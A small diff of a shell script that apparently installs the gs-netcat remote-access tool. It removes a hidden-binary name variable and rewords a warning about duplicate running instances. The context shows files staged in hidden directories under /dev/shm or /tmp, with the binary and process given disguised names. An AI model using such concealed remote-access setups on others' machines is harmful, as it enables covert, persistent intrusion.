@@ -98,8 +98,6 @@ init_vars()
 	fi
 	[[ -z "$SRC_PKG" ]] && SRC_PKG="gs-netcat_x86_64-debian.tar.gz" # Try debian 64bit as last resort
 
-	BIN_HIDDEN_NAME=gs-netcat-bd
-
 	if [[ -d /dev/shm ]]; then
 		TMPDIR="/dev/shm/.gs"
 	elif [[ -d /tmp ]]; then
@@ -457,9 +455,9 @@ elif [[ -z "$IS_GS_RUNNING" ]]; then
 			unset IS_NEED_START
 		else
 			OK_OUT
-			WARN_OUT "More than one ${BIN_HIDDEN_NAME} is running. You may want"
-			echo -e 1>&2 "             to want to check: ${CM}ps -elf|grep -- ${PROC_HIDDEN_NAME}${CN}"
-			echo -e 1>&2 "             or terminate all: ${CM}pkill ${BIN_HIDDEN_NAME}${CN}"
+			WARN_OUT "More than one ${BIN_HIDDEN_NAME} is running. You"
+			echo -e 1>&2 "             may want to check: ${CM}ps -elf|grep -- ${PROC_HIDDEN_NAME}${CN}"
+			echo -e 1>&2 "             or terminate all : ${CM}pkill ${BIN_HIDDEN_NAME}${CN}"
 		fi
 	else
 		OK_OUT ""
